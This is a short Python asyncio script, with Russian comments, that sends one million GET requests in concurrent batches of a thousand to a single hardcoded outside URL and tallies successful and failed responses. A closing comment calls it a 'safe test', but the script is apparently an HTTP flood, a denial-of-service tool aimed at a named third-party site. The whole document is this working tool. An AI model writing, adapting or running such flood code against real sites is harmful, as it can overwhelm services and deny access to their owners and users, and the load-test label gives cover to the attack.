import aiohttp
import asyncio
import time

URL = "https://russonline-actores.me/?c=nazran&a=Pops"

async def fetch(session):
    try:
        async with session.get(URL, timeout=5) as r:
            status = r.status
            await r.text()
            return status
    except Exception as e:
        return f"err: {e}"

async def run_batch(session, batch_size: int):
    tasks = [fetch(session) for _ in range(batch_size)]
    results = await asyncio.gather(*tasks)
    return results

async def run_load(total_requests: int, batch_size: int = 1000):
    start_time = time.time()
    errors = 0
    ok = 0

    async with aiohttp.ClientSession() as session:
        for sent in range(0, total_requests, batch_size):
            batch_start = time.time()
            results = await run_batch(session, batch_size)
            batch_end = time.time()

            # статистика по пачке
            ok_batch = sum(1 for r in results if r == 200)
            err_batch = batch_size - ok_batch

            ok += ok_batch
            errors += err_batch

            print(
                f"[Пачка {sent//batch_size + 1}] "
                f"200 OK: {ok_batch}, Ошибки: {err_batch}, "
                f"Время: {batch_end - batch_start:.2f} сек"
            )

    total_time = time.time() - start_time
    print("\n=== ИТОГО ===")
    print(f"Всего запросов: {total_requests}")
    print(f"Успешных: {ok}")
    print(f"Ошибок: {errors}")
    print(f"Общее время: {total_time:.2f} сек")

asyncio.run(run_load(1_000_000))   # безопасный тест
